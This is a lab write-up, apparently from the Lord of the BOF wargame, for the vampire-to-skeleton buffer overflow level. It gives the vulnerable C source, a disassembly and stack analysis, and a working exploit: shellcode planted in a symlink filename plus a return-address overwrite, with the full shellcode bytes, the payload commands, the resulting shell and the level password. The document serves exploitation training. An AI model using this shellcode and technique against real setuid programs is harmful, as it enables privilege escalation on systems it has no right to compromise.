# Level 9, Vampire -> Skeleton

## skeleton.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - skeleton
        - argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i, saved_argc;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        // argc saver
        saved_argc = argc;

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // ultra argv hunter!
        for(i=0; i<saved_argc; i++)
                memset(argv[i], 0, strlen(argv[i]));
}
```

### Analysis

#### Disassembling the "skeleton"

```c
Dump of assembler code for function main:
0x8048500 <main>:       push   %ebp
0x8048501 <main+1>:     mov    %ebp,%esp
0x8048503 <main+3>:     sub    %esp,48
0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:    jg     0x8048523 <main+35>
0x804850c <main+12>:    push   0x80486d0
0x8048511 <main+17>:    call   0x8048410 <printf>
0x8048516 <main+22>:    add    %esp,4
0x8048519 <main+25>:    push   0
0x804851b <main+27>:    call   0x8048420 <exit>
0x8048520 <main+32>:    add    %esp,4
0x8048523 <main+35>:    nop
0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:    nop
0x804852c <main+44>:    lea    %esi,[%esi*1]
0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:    lea    %edx,[%eax*4]
0x804853a <main+58>:    mov    %eax,%ds:0x8049804
0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:    jne    0x8048547 <main+71>
0x8048545 <main+69>:    jmp    0x8048587 <main+135>
0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:    lea    %edx,[%eax*4]
0x8048551 <main+81>:    mov    %eax,%ds:0x8049804
0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:    push   %edx
0x804855a <main+90>:    call   0x80483f0 <strlen>
0x804855f <main+95>:    add    %esp,4
0x8048562 <main+98>:    mov    %eax,%eax
0x8048564 <main+100>:   push   %eax
0x8048565 <main+101>:   push   0
0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:   lea    %edx,[%eax*4]
0x8048571 <main+113>:   mov    %eax,%ds:0x8049804
0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:   push   %edx
0x804857a <main+122>:   call   0x8048430 <memset>
0x804857f <main+127>:   add    %esp,12
0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:   jmp    0x8048530 <main+48>
0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:   add    %eax,4
0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:   add    %edx,47
0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:   je     0x80485b0 <main+176>
0x8048597 <main+151>:   push   0x80486dc
0x804859c <main+156>:   call   0x8048410 <printf>
0x80485a1 <main+161>:   add    %esp,4
0x80485a4 <main+164>:   push   0
0x80485a6 <main+166>:   call   0x8048420 <exit>
0x80485ab <main+171>:   add    %esp,4
0x80485ae <main+174>:   mov    %esi,%esi
0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:   add    %eax,4
0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:   push   %edx
0x80485b9 <main+185>:   call   0x80483f0 <strlen>
0x80485be <main+190>:   add    %esp,4
0x80485c1 <main+193>:   mov    %eax,%eax
0x80485c3 <main+195>:   cmp    %eax,48
0x80485c6 <main+198>:   jbe    0x80485e0 <main+224>
0x80485c8 <main+200>:   push   0x80486f9
0x80485cd <main+205>:   call   0x8048410 <printf>
0x80485d2 <main+210>:   add    %esp,4
0x80485d5 <main+213>:   push   0
0x80485d7 <main+215>:   call   0x8048420 <exit>
0x80485dc <main+220>:   add    %esp,4
0x80485df <main+223>:   nop
0x80485e0 <main+224>:   mov    %eax,DWORD PTR [%ebp+8]
0x80485e3 <main+227>:   mov    DWORD PTR [%ebp-48],%eax
0x80485e6 <main+230>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485e9 <main+233>:   add    %eax,4
0x80485ec <main+236>:   mov    %edx,DWORD PTR [%eax]
0x80485ee <main+238>:   push   %edx
0x80485ef <main+239>:   lea    %eax,[%ebp-40]
0x80485f2 <main+242>:   push   %eax
0x80485f3 <main+243>:   call   0x8048440 <strcpy>
0x80485f8 <main+248>:   add    %esp,8
0x80485fb <main+251>:   lea    %eax,[%ebp-40]
0x80485fe <main+254>:   push   %eax
0x80485ff <main+255>:   push   0x8048710
0x8048604 <main+260>:   call   0x8048410 <printf>
0x8048609 <main+265>:   add    %esp,8
0x804860c <main+268>:   push   40
0x804860e <main+270>:   push   0
0x8048610 <main+272>:   lea    %eax,[%ebp-40]
0x8048613 <main+275>:   push   %eax
0x8048614 <main+276>:   call   0x8048430 <memset>
0x8048619 <main+281>:   add    %esp,12
0x804861c <main+284>:   mov    DWORD PTR [%ebp-44],0x0
0x8048623 <main+291>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048626 <main+294>:   cmp    %eax,DWORD PTR [%ebp-48]
0x8048629 <main+297>:   jl     0x8048630 <main+304>
0x804862b <main+299>:   jmp    0x8048670 <main+368>
0x804862d <main+301>:   lea    %esi,[%esi]
0x8048630 <main+304>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048633 <main+307>:   lea    %edx,[%eax*4]
0x804863a <main+314>:   mov    %eax,DWORD PTR [%ebp+12]
0x804863d <main+317>:   mov    %edx,DWORD PTR [%eax+%edx]
0x8048640 <main+320>:   push   %edx
0x8048641 <main+321>:   call   0x80483f0 <strlen>
0x8048646 <main+326>:   add    %esp,4
0x8048649 <main+329>:   mov    %eax,%eax
0x804864b <main+331>:   push   %eax
0x804864c <main+332>:   push   0
0x804864e <main+334>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048651 <main+337>:   lea    %edx,[%eax*4]
0x8048658 <main+344>:   mov    %eax,DWORD PTR [%ebp+12]
0x804865b <main+347>:   mov    %edx,DWORD PTR [%eax+%edx]
0x804865e <main+350>:   push   %edx
0x804865f <main+351>:   call   0x8048430 <memset>
0x8048664 <main+356>:   add    %esp,12
0x8048667 <main+359>:   inc    DWORD PTR [%ebp-44]
0x804866a <main+362>:   jmp    0x8048623 <main+291>
0x804866c <main+364>:   lea    %esi,[%esi*1]
0x8048670 <main+368>:   leave
0x8048671 <main+369>:   ret
```

#### Estimated Stack Structure

```text
|  saved_argc (4 bytes) | [%ebp-48]
|  i (4 bytes)          | [%ebp-44]
|  BUFFER (40 bytes)    | [%ebp-40]
|  SFP (4 bytes)        | [%ebp]
|  RET (4 bytes)        | [%ebp+4]
|  ARGC (4 bytes)       | [%ebp+8]
|  Pointer to ARGV[0]   | [%ebp+12]
```

#### Observed Stack Structure (bp at *main+251)

```cs
(gdb) run `python -c "print 'ABCDEFGHIJ'+'A'*34+'\xbf\xbf\xbf\xbf'"`
Starting program: /home/vampire/skeleton-cp `python -c "print 'ABCDEFGHIJ'+'A'*34+'\xbf\xbf\xbf\xbf'"`

Breakpoint 1, 0x80485fb in main ()
(gdb) x/100x $esp
0xbffffaa8:     0x00000002      0x00000015      0x44434241      0x48474645
0xbffffab8:     0x41414a49      0x41414141      0x41414141      0x41414141
0xbffffac8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffad8:     0x41414141      0xbfbfbfbf      0x00000000      0xbffffb24
0xbffffae8:     0xbffffb30      0x40013868      0x00000002      0x08048450
0xbffffaf8:     0x00000000      0x08048471      0x08048500      0x00000002
0xbffffb08:     0xbffffb24      0x08048390      0x080486ac      0x4000ae60
0xbffffb18:     0xbffffb1c      0x40013e90      0x00000002      0xbffffc1f
0xbffffb28:     0xbffffc39      0x00000000      0xbffffc6a      0xbffffc7c
0xbffffb38:     0xbffffc95      0xbffffcb4      0xbffffcd6      0xbffffce3
0xbffffb48:     0xbffffea6      0xbffffec5      0xbffffee2      0xbffffef7
0xbffffb58:     0xbfffff16      0xbfffff21      0xbfffff31      0xbfffff39
0xbffffb68:     0xbfffff4a      0xbfffff54      0xbfffff62      0xbfffff73
0xbffffb78:     0xbfffff81      0xbfffff8c      0xbfffff9f      0x00000000
0xbffffb88:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffffb98:     0x00000005      0x00000006      0x00000006      0x00001000
0xbffffba8:     0x00000007      0x40000000      0x00000008      0x00000000
0xbffffbb8:     0x00000009      0x08048450      0x0000000b      0x000001fd
0xbffffbc8:     0x0000000c      0x000001fd      0x0000000d      0x000001fd
0xbffffbd8:     0x0000000e      0x000001fd      0x00000010      0x0fabfbff
0xbffffbe8:     0x0000000f      0xbffffc1a      0x00000000      0x00000000
0xbffffbf8:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc08:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc18:     0x36690000      0x2f003638      0x656d6f68      0x6d61762f
0xbffffc28:     0x65726970      0x656b732f      0x6f74656c      0x70632d6e
```

### Exploit

#### How to pwn

```c
1. Create symbolic link file with shellcode in its name
ln -sf ~/skeleton /tmp/`python -c "print '\x90'*150+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'+'\x90'*50"`

2. Execute symbolic link with overwritten RET
./`python -c "print '\x90'*150+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'+'\x90'*50"` `python -c "print 'A'*44+'\x30\xff\xff\xbf'"`
```

#### Shellcode (48 bytes)

```c
\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
```

#### Final Payload

```c
./`python -c "print '\x90'*150+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'+'\x90'*50"` `python -c "print 'A'*44+'\x30\xff\xff\xbf'"`
```

### Result

```c
[vampire@localhost /tmp]$ ./`python -c "print '\x90'*150+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'+'\x90'*50"` `python -c "print 'A'*44+'\x30\xff\xff\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0▒▒▒
bash$ id
uid=509(vampire) gid=509(vampire) euid=510(skeleton) egid=510(skeleton) groups=509(vampire)
bash$ my-pass
euid = 510
shellcoder
```